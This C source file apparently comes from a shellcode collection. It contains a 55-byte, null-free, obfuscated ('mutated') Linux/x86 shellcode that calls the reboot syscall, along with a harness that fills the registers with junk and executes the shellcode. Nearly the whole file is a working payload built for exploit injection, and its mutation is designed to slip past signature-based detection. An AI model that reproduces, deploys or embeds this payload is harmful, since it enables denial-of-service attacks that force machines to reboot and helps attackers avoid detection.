/*

   Mutated Reboot Shellcode - C Language - Linux/x86
   Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see &t;http://www.gnu.org/licenses/>.

*/

/*

   mutated_reboot_shellcode

   * 55 bytes
   * null-free
   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)


   # gcc -m32 -fno-stack-protector -z execstack mutated_reboot_shellcode.c -o mutated_reboot_shellcode

   Testing
   * Only run it in a Virtual Machine!!! Your system will crash. Use at your own risk!
   * To work properly, you must be su!

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

              "\x29\xff\x74\x01\xe8\x83\xc7\x24\x97\xeb"
              "\x01\xe1\xcd\x80\xeb\x01\xff\x6a\x29\x59"
              "\xeb\x01\x01\xbb\x67\x45\x23\x01\xba\xca"
              "\x9b\xc2\xff\x31\xda\x75\x01\xe7\x87\xda"
              "\x8d\x41\x2f\x8d\x89\x40\x19\x12\x28\xeb"
              "\x02\xe8\x01\xcd\x80";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}